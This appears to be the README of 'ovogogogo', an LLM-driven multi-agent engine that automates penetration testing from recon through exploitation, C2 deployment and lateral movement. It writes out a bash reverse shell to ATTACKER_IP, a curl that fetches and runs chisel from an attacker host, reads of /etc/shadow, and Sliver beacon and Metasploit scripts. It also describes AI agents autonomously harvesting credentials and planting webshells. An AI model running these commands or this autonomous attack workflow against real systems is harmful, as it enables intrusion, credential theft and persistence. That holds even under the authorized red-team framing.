# OVOGOGOGO — 红队渗透测试自动化引擎

> 基于 LLM 的全自动攻击链执行引擎 · OpenAI 兼容 API · 多智能体并行架构

---

## 目录

1. [项目简介](#一项目简介)
2. [核心特性](#二核心特性)
3. [LLM 工程技术体系](#三llm-工程技术体系)
4. [系统架构](#四系统架构)
5. [工具清单（16个）](#五工具清单16个)
6. [多智能体架构（17种专用 Agent）](#六多智能体架构17种专用-agent)
7. [武器库 · WeaponRadar RAG](#七武器库--weaponradar-rag)
8. [反弹 Shell 会话管理 · ShellSession](#八反弹-shell-会话管理--shellsession)
9. [自动批判纠错 · Critic Loop](#九自动批判纠错--critic-loop)
10. [中断注入 · 人机协同](#十中断注入--人机协同)
11. [C2 与内网穿透](#十一c2-与内网穿透)
12. [Engagement 配置](#十二engagement-配置)
13. [技能系统 Skills](#十三技能系统-skills)
14. [典型完整攻击链](#十四典型完整攻击链)
15. [目录结构](#十五目录结构)
16. [部署与启动](#十六部署与启动)

---

## 一、项目简介

**ovogogogo** 是一个专为红队渗透测试设计的大语言模型驱动自动化引擎。它将完整攻击链——外网侦察、漏洞扫描、漏洞利用、反弹 Shell 管理、权限提升、C2 部署、内网横移、报告生成——全部封装为自主执行的 AI 工作流。

引擎以 **OpenAI Function Calling** 格式对接任意兼容端点，通过 **ReAct（Think-Act-Observe）** 主循环驱动 LLM 持续推理和执行，内置 17 种专用红队 Agent 类型，支持 `Promise.all` 级别的真并行多智能体。

```
用户输入一句任务 → 引擎自主规划 → 多 Agent 并行执行完整攻击链 → 输出渗透测试报告
```

| 项目 | 内容 |
|------|------|
| API 格式 | OpenAI 兼容（支持任意兼容端点） |
| 运行时 | Node.js 22 + TypeScript |
| 工具数量 | 16 个内置工具 |
| Agent 类型 | 17 种专用红队 Agent |
| PoC 数据库 | 22 万条 Nuclei PoC（BGE-M3 语义检索） |

---

## 二、核心特性

### 全链路自动化
覆盖完整渗透测试攻击链：侦察 → 武器匹配 → 漏洞扫描 → 漏洞利用 → 后渗透 → C2 部署 → 内网横移 → 报告，每个阶段有专属 Agent 和工具集。

### 真并行多智能体
`MultiAgent` 工具一次调用同时启动多个 Agent，引擎内部用 `Promise.all` 并行执行。Phase 1 侦察三个 Agent 同时跑，比串行快 3 倍。

### 22 万 PoC 武器库语义检索（RAG）
内置 `WeaponRadar` 工具，对 22 万条 Nuclei PoC 做 BGE-M3 向量检索，返回完整可执行 PoC YAML 和 nuclei 命令。发现目标服务版本 → 立即匹配 → 立即执行验证，全程自动。

### 反弹 Shell 持久会话
`ShellSession` 工具基于 Node.js `net` 模块管理 TCP 反弹 shell 连接。获得 shell 后，后续所有 post-exploit / privesc 命令都通过同一个持久通道执行，会话跨 Agent 共享。

### 自动批判纠错（Critic Loop）
引擎每 5 轮自动触发一次 Critic 检查，独立 LLM 调用审阅最近 24 条消息，检测"PoC 找到但未执行"、"工具缺失直接手动替代"、"重要发现被遗忘"等常见失误，注入纠错消息。

### 人机协同中断注入
任务执行中按 Ctrl+C 一次：引擎暂停（当前工具执行完成后），提示用户输入建议，注入对话后继续。再按一次 Ctrl+C：立即硬取消。readline 不会关闭，对话历史完整保留。

---

## 三、LLM 工程技术体系

### 3.1 ReAct — Think-Act-Observe 主循环

引擎核心遵循 ReAct 模式（Reasoning + Acting）：

```
while iterations < maxIterations:
    response = LLM(systemPrompt + history)      // Think
    if response.tool_calls:
        results = execute_parallel(tool_calls)  // Act
        history.push(results)                   // Observe
    else:
        return response.text                    // 最终答案
```

LLM 在每轮自主决定调用哪些工具、以什么顺序、携带什么参数，形成完整的规划-执行-观察闭环。主引擎上限 200 轮，子 Agent 按类型设置 60-120 轮。

### 3.2 OpenAI Function Calling（结构化工具调用）

工具描述以 JSON Schema 格式注入 API 请求，LLM 返回结构化 `tool_calls` 数组，引擎解析后分发到对应实现：

```typescript
class WeaponRadarTool implements Tool {
  definition: ToolDefinition = {
    type: 'function',
    function: { name: 'WeaponRadar', parameters: { /* JSON Schema */ } }
  }
  async execute(input, context): Promise<ToolResult> { /* HTTP → RAG API */ }
}
```

### 3.3 流式输出（SSE Streaming）

使用 OpenAI SSE 流式接口，LLM 推理过程实时渲染到终端，工具调用完成后立即显示结果：

```typescript
const stream = await client.chat.completions.create({ stream: true, ... })
for await (const chunk of stream) {
  renderer.streamToken(chunk.choices[0].delta.content ?? '')
}
```

### 3.4 并行工具调度

同一 LLM 响应中的多个工具调用按安全性分批：并发安全工具（Bash、Agent、WeaponRadar、Read 等）用 `Promise.all` 同时执行；写操作工具（Write、Edit、FindingWrite）串行执行。

```typescript
// engine.ts — 并行批次调度
const batches = partitionToolCalls(parsedCalls)
for (const batch of batches) {
  if (batch.safe) {
    await Promise.all(batch.calls.map(execute))  // 并行
  } else {
    for (const call of batch.calls) await execute(call)  // 串行
  }
}
```

64 核服务器支持 50+ 并发 Bash 进程和 Agent 实例同时运行。

### 3.5 MultiAgent — 强制并行子智能体

`MultiAgent` 工具将多个 Agent 打包为一次调用，解决 LLM 逐个调用 Agent 导致串行的问题：

```typescript
// 一次工具调用，内部 Promise.all 全并行
MultiAgent({
  agents: [
    { subagent_type: "dns-recon",  description: "DNS侦察", prompt: "..." },
    { subagent_type: "port-scan",  description: "端口扫描", prompt: "..." },
    { subagent_type: "web-probe",  description: "Web探测", prompt: "..." },
  ]
})
```

### 3.6 RAG — 武器库语义检索增强

WeaponRadar 工具集成向量数据库语义检索，将自然语言攻击意图映射到可执行 PoC：

```
攻击意图描述（自然语言）
    ↓ BGE-M3 嵌入（1024 维）
    ↓ pgvector 余弦相似度检索（22 万条 PoC）
    ↓ TOP-K 相关 PoC（含完整 YAML + CVE + nuclei 命令）
    ↓ 注入 LLM 上下文 → 直接生成验证命令并执行
```

批量查询模式（`queries: []`）共享同一次 BGE-M3 模型加载，多个查询只需等待一次。

### 3.7 自动上下文压缩（Auto-Compact）

对话历史超过 token 阈值时，引擎自动调用 LLM 进行摘要压缩，保留关键发现，丢弃冗余工具输出：

```typescript
if (estimatedTokens > COMPACT_THRESHOLD_TOKENS) {
  const compacted = await maybeCompact(client, model, messages)
  messages = compacted.messages  // ~70% token 节省
}
```

支持长时间、多阶段渗透任务而不中断。

### 3.8 自动批判纠错（Critic Loop）

每 5 个迭代轮次，引擎发起独立 LLM 调用，以"第三方监督视角"审查近期操作历史，检测以下失误类型：

| 失误类型 | 示例 |
|---------|------|
| PoC 未执行 | WeaponRadar 返回 PoC 但未写文件未运行 nuclei |
| 工具降级 | command not found 后直接改用 curl 手工测试 |
| 发现被遗忘 | 早期发现的开放端口/凭证未被后续步骤跟进 |
| 任务偏离 | 陷入无关操作，脱离主攻击目标 |
| 交互式进程阻塞 | msfconsole 未用资源文件，挂在 meterpreter > 等待 |

发现问题时，Critic 输出注入为 `[🔍 自动纠错检查]` 用户消息，下一轮主 Agent 据此调整行动。

### 3.9 专用系统 Prompt（Agent 角色专业化）

每种 Agent 类型有独立、高度专业化的系统 Prompt（`src/prompts/agentPrompts.ts`），包含：

- 精确工具调用规范（防止 nmap/nuclei/httpx 常见错误）
- 64 核最优并发参数
- 输出文件路径规范（统一写到 `sessionDir`）
- 特定任务决策树（如 exploit agent 的 RCE → webshell → C2 路径）

### 3.10 技能系统（动态上下文注入）

`.ovogo/skills/*.md` 技能文件在用户调用 `/skill-name` 时注入对话上下文，相当于 Few-Shot Prompt：

```
技能 Markdown 文件 → YAML frontmatter 解析 → $ARGS 替换 → 注入系统上下文
```

51 个技能文件覆盖所有主要渗透工具的最佳实践。

---

## 四、系统架构

```
┌─────────────────────────────────────────────────────────────────┐
│                         CLI 入口（bin/ovogogogo.ts）              │
│  REPL 主循环  ·  Engagement 加载  ·  Session 目录创建  ·  Hook 系统 │
└───────────────────────────┬─────────────────────────────────────┘
                            │
┌───────────────────────────▼─────────────────────────────────────┐
│                      执行引擎（src/core/engine.ts）                │
│                                                                 │
│  ReAct 主循环（200轮）                                            │
│  ├─ LLM 流式调用（OpenAI SSE）                                    │
│  ├─ 工具并发调度（partitionToolCalls → Promise.all）               │
│  ├─ Auto-Compact（token 超限时自动压缩历史）                        │
│  ├─ Critic Loop（每5轮独立审查，注入纠错）                          │
│  └─ 软中断（softAbort → reason='interrupted' → 用户注入）          │
└──────────┬─────────────────────┬───────────────────────────────┘
           │                     │
┌──────────▼──────────┐ ┌────────▼────────────────────────────────┐
│    工具注册表（16个）  │ │              Prompt 层                   │
│  Bash · Agent       │ │  system.ts   — 主引擎身份+全局规范          │
│  MultiAgent         │ │  agentPrompts.ts — 17种专用 Agent Prompt  │
│  ShellSession       │ │  tools.ts    — 工具描述（BASH_DESCRIPTION）  │
│  WeaponRadar        │ └─────────────────────────────────────────┘
│  MultiScan          │
│  FindingWrite/List  │ ┌─────────────────────────────────────────┐
│  Read/Write/Edit    │ │            配置与基础设施                  │
│  Glob · Grep        │ │  settings.ts — EngagementScope 加载      │
│  WebFetch/Search    │ │  memory/     — MEMORY.md 持久记忆         │
│  TodoWrite          │ │  skills/     — 51个工具技能文件             │
└─────────────────────┘ │  findings/   — 漏洞记录（JSON）            │
                        │  sessions/   — 每次会话输出目录             │
                        └─────────────────────────────────────────┘
                                        │
                        ┌───────────────▼───────────────────────────┐
                        │            外部基础设施                      │
                        │  WeaponRadar API（HTTP :8765）              │
                        │  PostgreSQL + pgvector（22万 PoC）          │
                        │  BGE-M3 嵌入模型（sentence-transformers）    │
                        │  Sliver C2 Server                          │
                        │  chisel + proxychains（内网穿透）            │
                        └───────────────────────────────────────────┘
```

### 核心参数

| 参数 | 值 | 说明 |
|------|----|------|
| `DEFAULT_TIMEOUT_MS` | 1,800,000（30 min） | Bash 工具默认超时 |
| `MAX_TIMEOUT_MS` | 14,400,000（4 h） | Bash 工具最大超时 |
| `MAX_TOOL_RESULT_LENGTH` | 20,000 chars | 工具输出截断上限 |
| `COMPACT_THRESHOLD_TOKENS` | 见 compact.ts | 触发自动压缩的 token 数 |
| `CRITIC_INTERVAL` | 5 轮 | Critic 触发频率 |
| `CRITIC_CONTEXT_MESSAGES` | 24 条 | Critic 审查的消息窗口 |
| 主引擎 `maxIterations` | 200 | 主引擎最大轮次 |

---

## 五、工具清单（16个）

| 工具 | 并发安全 | 说明 |
|------|:-------:|------|
| `Bash` | ✅ | Shell 命令执行，30 min 默认超时，支持 `run_in_background` 后台模式 |
| `Agent` | ✅ | 专用红队 sub-agent，17 种类型，最高 200 轮；`Promise.all` 并行 |
| **`MultiAgent`** | ✅ | **单次调用同时启动多个 Agent，强制并行；替代逐个 Agent 串行调用** |
| **`ShellSession`** | ✅ | **反弹 Shell 持久会话管理；listen / exec / list / kill；跨 Agent 共享连接** |
| `WeaponRadar` | ✅ | 22 万 PoC 语义检索；`queries[]` 批量；默认返回完整可执行 PoC YAML |
| `MultiScan` | ✅ | 多工具并行启动：`detach: false`（等待）/ `detach: true`（后台+轮询） |
| `FindingWrite` | ❌ | 写漏洞记录到 `.ovogo/findings/`，含 PoC 命令 + MITRE TTP |
| `FindingList` | ✅ | 读漏洞记录，支持 severity / tag 过滤 |
| `Read` | ✅ | 文件读取，支持行范围 |
| `Write` | ❌ | 文件写入（串行） |
| `Edit` | ❌ | 精确字符串替换（串行） |
| `Glob` | ✅ | 文件路径模式匹配 |
| `Grep` | ✅ | 正则内容搜索（ripgrep） |
| `WebFetch` | ✅ | HTTP 请求，返回纯文本（OSINT / CVE 查询） |
| `WebSearch` | ✅ | 网络搜索 |
| `TodoWrite` | ❌ | 多步骤任务分解跟踪 |

**粗体**为本项目新增工具。

---

## 六、多智能体架构（17种专用 Agent）

```
Orchestrator（主引擎，200 轮上限）
│
│  同一响应中使用 MultiAgent → 各阶段所有 Agent 同时运行（Promise.all）
│
├── Phase 1: 侦察  [3个 Agent 同时]
│   ├── dns-recon     (80轮)   subfinder · dnsx · amass
│   │                          → subs.txt / ips.txt / dns_records.txt
│   ├── port-scan     (80轮)   nmap 两步后台 · masscan · naabu
│   │                          → nmap_ports.txt / nmap_services.txt
│   └── web-probe     (80轮)   httpx · katana · gau · wafw00f
│                              → web_assets.txt / katana_urls.txt
│
├── Phase 2: 情报  [2个 Agent 同时]
│   ├── weapon-match  (60轮)   WeaponRadar 批量检索 → PoC YAML + nuclei 验证
│   │                          → pocs/*.yaml
│   └── osint         (60轮)   WebSearch · crt.sh · GitHub dork · 证书透明度
│                              → osint_findings.txt
│
├── Phase 3: 漏洞扫描  [3个 Agent 同时]
│   ├── web-vuln      (120轮)  nuclei（-c 100 -bs 50 -rl 500）· ffuf · nikto
│   │                          → nuclei_web.txt / ffuf_dirs.json
│   ├── service-vuln  (100轮)  nuclei 网络层 · nmap-vuln · enum4linux · SMB
│   │                          → nuclei_network.txt / service_vulns.txt
│   └── auth-attack   (100轮)  hydra · kerbrute · netexec 默认凭证
│                              → valid_creds.txt
│
├── Phase 4: 漏洞验证与利用  [每漏洞独立 Agent]
│   ├── poc-verify    (60轮)   nuclei PoC 验证 + 证据收集 + FindingWrite
│   │                          → evidence/CVE-XXXX_proof.txt
│   ├── exploit       (100轮)  RCE → ShellSession 反弹 Shell → 工具上传
│   │                          → shells.txt
│   └── webshell      (80轮)   PHP/JSP/ASPX webshell 部署与命令执行验证
│                              → webshells.txt
│
├── Phase 5: 后渗透  [3个 Agent 同时]
│   ├── post-exploit  (80轮)   ShellSession exec · 凭证/hash/SSH私钥收集
│   │                          → loot/passwords.txt / loot/hashes.txt
│   ├── privesc       (100轮)  ShellSession exec · linpeas · SUID/sudo/cron
│   │                          → root_shell.txt
│   └── c2-deploy     (80轮)   Sliver beacon 生成/上传/执行/等待上线
│                              → beacon_active.txt
│
├── Phase 6: 内网横移  [3个 Agent 同时]
│   ├── tunnel        (80轮)   chisel 反向 SOCKS5 · proxychains 配置
│   │                          → socks5_active.txt
│   ├── internal-recon(100轮)  proxychains + nmap/httpx 内网资产发现
│   │                          → internal_hosts.txt
│   └── lateral       (120轮)  MS17-010 · PTH · 凭证复用 · SSH 横向
│                              → lateral_access.txt
│
└── Phase 7: 报告  [1个 Agent]
    └── report        (60轮)   FindingList + 所有证据 → 完整渗透测试报告
                               → report.md
```

每个 sub-agent 是完整的引擎实例，拥有独立系统 Prompt、独立工具集、独立对话历史。**sub-agent 不可再调用 Agent（禁止递归）**，所有工具可用（只读类型除外）。

---

## 七、武器库 · WeaponRadar RAG

### 数据库规格

| 项目 | 内容 |
|------|------|
| 存储 | PostgreSQL + pgvector 扩展 |
| 数据量 | 217,358 条 Nuclei PoC，全部含 `full_poc_code` |
| 向量索引 | HNSW（`poc_vector vector_cosine_ops`） |
| 嵌入模型 | BGE-M3（1024 维，sentence-transformers） |
| 关键字段 | `module_name` · `rank_score` · `full_poc_code` · `ai_analysis` · `cve_list` · `required_options` |

**质量分级：**

| rank_score | 标签 | 数量 | 含义 |
|:----------:|:----:|:----:|------|
| 600 | critical | 22,603 | 已验证可利用（RCE / Auth Bypass 等） |
| 500 | high | 46,256 | 高危漏洞检测 |
| 300 | medium | 78,548 | 中危漏洞检测 |
| 100 | low | 50,215 | 低危/信息泄露 |
| 0 | info | 19,736 | 指纹识别/版本探测 |

### HTTP API（端口 8765）

| 接口 | 方法 | 说明 |
|------|:----:|------|
| `/health` | GET | 健康检查 |
| `/stats` | GET | 数据库统计（总量/评级分布） |
| `/query` | POST | 单条自然语言语义检索 |
| `/batch` | POST | 批量检索（共享已加载模型，推荐） |
| `/cve/<id>` | GET | 按 CVE ID 精确直查 |

### 调用示例

```typescript
// 批量查询（推荐）—— 模型只加载一次
WeaponRadar({
  queries: ["Apache Log4j RCE", "Shiro 反序列化", "Jenkins RCE"],
  top_k: 3
})
// 返回：score_pct / attack_logic / poc_code(完整YAML) / nuclei执行命令
```

### 强制执行规范

WeaponRadar 返回结果后，引擎 Prompt 强制要求立即执行（score ≥ 60%）：

```bash
# 步骤 1：写入 PoC 文件
cat > /tmp/poc_CVE-XXXX.yaml << 'NUCLEI_EOF'
{poc_code 完整内容}
NUCLEI_EOF

# 步骤 2：立即运行验证
nuclei -u https://target.com -t /tmp/poc_CVE-XXXX.yaml -silent -json
```

---

## 八、反弹 Shell 会话管理 · ShellSession

传统 `nc -lvnp 4444 > file.txt &` 只能捕获输出，无法向 shell 发送命令。`ShellSession` 工具基于 Node.js `net` 模块维护持久 TCP 双向连接，支持对同一 shell 持续执行命令。

### 操作接口

| action | 必填参数 | 说明 |
|--------|---------|------|
| `listen` | `port` | 启动 TCP 监听，等待反弹 shell 连入，同时写 log 文件 |
| `exec` | `session_id`, `command` | 向已建立的 shell 发送命令，等待输出稳定后返回 |
| `list` | — | 列出所有活跃会话及连接状态 |
| `kill` | `session_id` | 关闭连接 |

### 典型工作流

```typescript
// 步骤 1：启动监听
ShellSession({ action: "listen", port: 4444, log_dir: "/sessions/target/" })
// → 返回 session_id: "shell_4444" 和触发反弹的命令示例

// 步骤 2：在目标上触发反弹（通过 RCE / WebShell）
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

// 步骤 3：shell 连入后发命令（可无限次重复）
ShellSession({ action: "exec", session_id: "shell_4444", command: "id && whoami" })
// → "uid=0(root) gid=0(root) groups=0(root)"

ShellSession({ action: "exec", session_id: "shell_4444", command: "cat /etc/shadow" })
ShellSession({ action: "exec", session_id: "shell_4444",
  command: "find / -perm -4000 -type f 2>/dev/null",
  timeout: 30000
})
```

**关键特性：**
- 会话存储在进程级 `Map` 中，exploit agent 建立的连接对 post-exploit / privesc agent 同样可见
- 输出判定：发命令后 400 ms 无新数据视为命令完成，支持自定义 `timeout`
- 自动剥除回显命令和 `# ` / `$ ` 提示符
- 每次 listen 自动创建 log 文件，记录完整交互历史

---

## 九、自动批判纠错 · Critic Loop

主引擎每执行 5 个迭代轮次，自动触发一次独立 LLM 调用，对最近 24 条消息进行"第三方监督审查"。

**检测失误类型：**

| # | 失误类型 | 触发条件 |
|---|---------|---------|
| 1 | PoC 未执行 | WeaponRadar 返回了 `poc_code`，但无后续 nuclei 执行 |
| 2 | 工具降级 | `command not found` 后直接 curl 手工替代，未先安装工具 |
| 3 | 发现被遗忘 | 早期扫描发现的端口/服务/凭证/漏洞未被后续步骤跟进 |
| 4 | 任务偏离 | 偏离主目标，陷入无关低价值操作 |
| 5 | 重复劳动 | 正在重复已完成的操作 |
| 6 | 交互式进程阻塞 | msfconsole 未用资源文件+`run -z`，挂在交互式提示符 |

**注入格式：**

```
[🔍 自动纠错检查]
⚠️ [问题] WeaponRadar 返回了 CVE-2024-1234 的 PoC，但未执行 nuclei 验证
↳ [纠正] 立即执行：cat > /tmp/poc_CVE-2024-1234.yaml << 'EOF' ... 再运行 nuclei -u TARGET -t /tmp/poc_CVE-2024-1234.yaml

请根据以上纠错提示立即调整行动。
```

Critic 仅在主引擎运行时触发（子 Agent 的 `sessionDir` 为空，不触发），避免递归开销。

---

## 十、中断注入 · 人机协同

任务执行时支持两阶段 Ctrl+C，允许用户随时介入提供建议而不丢失进度。

### 操作逻辑

```
第 1 次 Ctrl+C（任务运行中）
    ↓
engine.softAbort() — 设置软中断标志
    ↓
当前 tool 调用执行完毕（不强行终止）
    ↓
引擎返回 reason='interrupted'，完整对话历史保留
    ↓
显示：⚡ 任务已暂停 — 输入建议注入对话后继续，直接回车则恢复执行
    ↓
用户输入建议 → 注入 "[用户中途介入] {建议}" → 引擎继续执行
用户直接回车 → 注入 "[继续] 请继续自主推进任务" → 引擎继续执行

第 2 次 Ctrl+C（等待注入或任务运行中）
    ↓
engine.abort() — AbortController 传播，杀掉 in-flight API 调用和 Bash 进程组
    ↓
显示 "已取消。" → 返回 ❯ 提示符
```

**readline 不会在 Ctrl+C 时关闭**（`rl.on('SIGINT', () => {})` 阻止默认行为），对话历史和 ShellSession 连接均完整保留。

### 典型场景

```
用户：对 192.168.1.100 进行渗透测试

[Agent 运行中，发现 80/443/8080 端口...]

用户按 Ctrl+C

⚡ 任务已暂停 — 输入建议注入对话后继续，直接回车则恢复执行
↳ 我注意到 8080 端口可能是 Jenkins，优先检查 Jenkins 漏洞

⚡ 已注入: 我注意到 8080 端口可能是 Jenkins，优先检查 Jenkins 漏洞

[Agent 调整策略，优先扫描 Jenkins CVE...]
```

---

## 十一、C2 与内网穿透

### Sliver C2

ovogogogo 集成 Sliver C2 框架，通过 `c2-deploy` 专用 Agent 自动生成 beacon、上传至目标并等待上线。

```bash
# 通过 RC 脚本非交互调用（msfconsole 模式类似）
/opt/sliver-client_linux --rc /tmp/c2_deploy.rc > /tmp/c2_out.txt 2>&1

# c2_deploy.rc 内容示例
generate beacon --http http://C2_SERVER:80 --os linux --arch amd64 --save /tmp/beacon
```

### chisel 内网穿透

```bash
# 攻击机（监听反向连接）
chisel server -p 8888 --reverse

# 目标机（通过已有 shell 执行）
ShellSession({ action: "exec", session_id: "shell_4444",
  command: "curl -s http://ATTACKER:8888/chisel -o /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client ATTACKER:8888 R:socks &"
})

# proxychains 透明代理内网扫描
proxychains4 nmap -sV -p 22,80,443,8080 192.168.1.0/24
```

### Metasploit 集成

Metasploit 模块通过资源文件 + `run -z` 非交互模式调用（避免阻塞在 `meterpreter >` 提示符）：

```bash
# 写资源文件
cat > /tmp/msf.rc << 'RCEOF'
use exploit/multi/http/target_rce
set RHOSTS 192.168.1.100
set LHOST ATTACKER_IP
set LPORT 4444
run -z          # 获得 session 后立即后台化，不进入交互模式
sleep 15
sessions -i 1 -C "id; whoami; uname -a"
exit -y         # 强制退出，即使有活跃 session
RCEOF

# 后台执行，轮询输出
Bash({ command: "msfconsole -q -r /tmp/msf.rc > /tmp/msf_out.txt 2>&1",
       run_in_background: true })
Bash({ command: "sleep 20 && tail -50 /tmp/msf_out.txt" })
```

---

## 十二、Engagement 配置

通过 `.ovogo/settings.json` 配置授权范围，引擎自动注入到所有 Agent 的系统 Prompt：

```json
{
  "engagement": {
    "name": "目标渗透测试 2026-Q2",
    "phase": "recon",
    "targets": ["example.com", "192.168.1.0/24"],
    "out_of_scope": ["mail.example.com"],
    "start_date": "2026-04-01",
    "end_date": "2026-04-30",
    "notes": "授权测试，仅限工作时间"
  },
  "hooks": {
    "PreToolCall": ["echo 'TOOL: $OVOGO_TOOL_NAME' >> /tmp/audit.log"],
    "PostToolCall": [],
    "UserPromptSubmit": []
  }
}
```

**Hook 系统**支持在每次工具调用前后、用户提交输入时执行任意 shell 命令（用于审计、通知等）。

每次运行自动创建带时间戳的 session 目录：

```
sessions/
└── example.com_20260401_143022/
    ├── subs.txt              # 子域名
    ├── nmap_ports.txt        # 端口扫描结果
    ├── web_assets.txt        # 活跃 Web 服务
    ├── nuclei_web.txt        # nuclei 扫描结果
    ├── pocs/                 # 匹配到的 PoC YAML
    ├── loot/                 # 凭证/哈希/密钥
    ├── evidence/             # 漏洞证据
    └── report.md             # 最终报告
```

---

## 十三、技能系统 Skills

`.ovogo/skills/*.md` — 51 个工具技能文件，用户输入 `/skill-name [args]` 时展开为完整 Prompt 注入对话：

| 类别 | 技能文件 |
|------|---------|
| 侦察 | `subfinder` · `dnsx` · `httpx` · `katana` · `nmap` · `masscan` · `naabu` · `gau` |
| 漏洞扫描 | `nuclei` · `nikto` · `ffuf` · `wpscan` · `sqlmap` |
| 漏洞利用 | `revshell` · `webshell` · `msfconsole` |
| 认证攻击 | `hydra` · `kerbrute` · `netexec` · `enum4linux` |
| 后渗透 | `privesc-linux` · `linpeas` · `loot` |
| C2 / 控制 | `sliver` · `chisel` · `shellsession` |
| OSINT | `amass` · `shodan` · `censys` · `github-dork` |
| 报告 | `report` · `finding` |

每个技能包含：正确命令路径、64 核最优并发参数、常见错误规避、与其他工具的配合示例。

---

## 十四、典型完整攻击链

```
用户：对 example.com 进行全面渗透测试

Orchestrator:
  ─ 读取 .ovogo/settings.json 确认授权目标
  ─ 创建 sessions/example.com_20260401_143022/

━━ Phase 1: 侦察（3个Agent同时）━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MultiAgent([dns-recon, port-scan, web-probe])
  → dns-recon    : 发现 52 个子域名，18 个活跃 IP
  → port-scan    : 开放 22/80/443/8080/6379 端口
  → web-probe    : 18 个 Web 服务，检测到 Apache Shiro, Jenkins, Redis

━━ Phase 2: 情报（2个Agent同时）━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MultiAgent([weapon-match, osint])
  → weapon-match : WeaponRadar 匹配到 Shiro CVE-2020-17523 + Jenkins CVE-2024-23897
                   写入 pocs/ 并立即 nuclei 验证，Shiro PoC 命中
  → osint        : GitHub 发现泄露的数据库密码

━━ Phase 3: 扫描（3个Agent同时）━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MultiAgent([web-vuln, service-vuln, auth-attack])
  → web-vuln     : nuclei 发现 CVE-2023-46604 (ActiveMQ RCE) → FindingWrite [CRITICAL]
  → service-vuln : Redis 未授权访问 → FindingWrite [HIGH]
  → auth-attack  : admin:admin123 爆破成功 → FindingWrite [HIGH]

━━ Phase 4: 利用━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MultiAgent([poc-verify, exploit, webshell])
  → poc-verify   : ActiveMQ RCE PoC 验证，截图保存 evidence/
  → exploit      : ShellSession({ listen: 4444 })
                   RCE 触发反弹 → ShellSession exec "id" → uid=1000(www-data)
  → webshell     : 上传 PHP webshell 作为持久化通道

━━ Phase 5: 后渗透（3个Agent同时）━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MultiAgent([post-exploit, privesc, c2-deploy])
  → post-exploit : ShellSession exec 收集 /etc/shadow, wp-config.php, id_rsa
  → privesc      : sudo CVE-2023-22809 提权 root，ShellSession exec "id" → uid=0
  → c2-deploy    : Sliver beacon 生成，上传并执行，等待上线

━━ Phase 6: 内网横移（3个Agent同时）━━━━━━━━━━━━━━━━━━━━━━━━━━
  MultiAgent([tunnel, internal-recon, lateral])
  → tunnel       : chisel 反向 SOCKS5 代理建立（端口 1080）
  → internal-recon: proxychains nmap 发现内网 192.168.1.0/24，17 台主机
  → lateral      : MS17-010 拿下 192.168.1.15，PTH 拿下 .20 和 .31

━━ Phase 7: 报告━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Agent(report)
  → FindingList + 所有 evidence/ → 生成 sessions/.../report.md
```

---

## 十五、目录结构

```
ovogogogo/
├── README.md
├── package.json / tsconfig.json
├── ovogo_progress.json          # 当前会话状态（断点续传）
│
├── bin/
│   └── ovogogogo.ts             # CLI 入口：REPL · Engagement 加载 · Hook 系统
│
├── src/
│   ├── core/
│   │   ├── engine.ts            # ReAct 主循环 · 并发调度 · Critic · 软中断
│   │   ├── types.ts             # 核心类型（EngineConfig · Tool · TurnResult）
│   │   └── compact.ts           # 上下文自动压缩
│   │
│   ├── tools/
│   │   ├── index.ts             # 工具注册表（16个工具）
│   │   ├── agent.ts             # AgentTool · runAgentTask 共享函数
│   │   ├── multiAgent.ts        # MultiAgent — 强制并行多 Agent
│   │   ├── shellSession.ts      # ShellSession — 反弹 Shell 持久会话
│   │   ├── bash.ts              # BashTool（30 min 超时 · 后台模式）
│   │   ├── weaponRadar.ts       # WeaponRadar（22万PoC · BGE-M3 语义检索）
│   │   ├── multiScan.ts         # MultiScan（Promise.all / nohup 两模式）
│   │   ├── finding.ts           # FindingWrite / FindingList
│   │   ├── fileRead/Write/Edit  # 文件操作
│   │   ├── glob.ts / grep.ts    # 文件搜索
│   │   ├── todo.ts              # 任务跟踪
│   │   └── webFetch/Search.ts   # 网络请求
│   │
│   ├── prompts/
│   │   ├── system.ts            # 主引擎 System Prompt（含全局规范）
│   │   ├── agentPrompts.ts      # 17种红队 Agent 专用 Prompt
│   │   └── tools.ts             # 工具描述（含交互式进程规范）
│   │
│   ├── config/
│   │   ├── settings.ts          # EngagementScope · Settings 加载
│   │   ├── hooks.ts             # Hook Runner（Pre/Post/Submit）
│   │   └── ovogomd.ts           # OVOGO.md 项目指令文件加载
│   │
│   ├── memory/
│   │   └── index.ts             # 持久记忆系统（MEMORY.md 索引）
│   │
│   ├── skills/
│   │   └── loader.ts            # 技能文件加载与展开
│   │
│   ├── services/mcp/            # MCP（Model Context Protocol）工具加载
│   │   ├── client.ts
│   │   ├── loader.ts
│   │   └── mcpTool.ts
│   │
│   └── ui/
│       ├── renderer.ts          # TUI：spinner · 工具展示 · 颜色 · 中断提示
│       └── input.ts             # readline 输入处理（SIGINT 安全）
│
├── .ovogo/
│   ├── settings.json            # Engagement 配置 + Hook 配置
│   ├── findings/                # 漏洞记录 JSON（f001.json ...）
│   └── skills/                  # 51个工具技能文档
│
├── sessions/                    # 渗透会话输出（每次自动创建时间戳目录）
│   └── target_YYYYMMDD_HHMMSS/
│       ├── subs.txt / ips.txt / nmap_*.txt
│       ├── web_assets.txt / nuclei_*.txt
│       ├── pocs/                # 匹配到的 PoC YAML
│       ├── loot/                # 凭证/哈希/私钥
│       ├── evidence/            # 漏洞证据
│       └── report.md
│
└── poc/                         # WeaponRadar 后端服务
    ├── server.py                # HTTP API 服务（端口 8765）
    └── weapon_radar.py          # 核心引擎（BGE-M3 + pgvector）
```

---

## 十六、部署与启动

### 环境要求

| 要求 | 说明 |
|------|------|
| Node.js | ≥ 22 |
| OpenAI 兼容 API | 需设置 `OPENAI_API_KEY` 和 `OPENAI_BASE_URL` |
| WeaponRadar 服务 | Python 3.10+，PostgreSQL + pgvector，sentence-transformers |
| 渗透工具 | nuclei · subfinder · httpx · ffuf · nmap · hydra 等（`$PATH` 可访问） |

### 启动

```bash
cd ovogogogo

# 安装依赖
npm install

# 编译 TypeScript
npm run build

# 配置环境变量
export OPENAI_API_KEY=sk-...
export OPENAI_BASE_URL=https://your-compatible-endpoint/v1
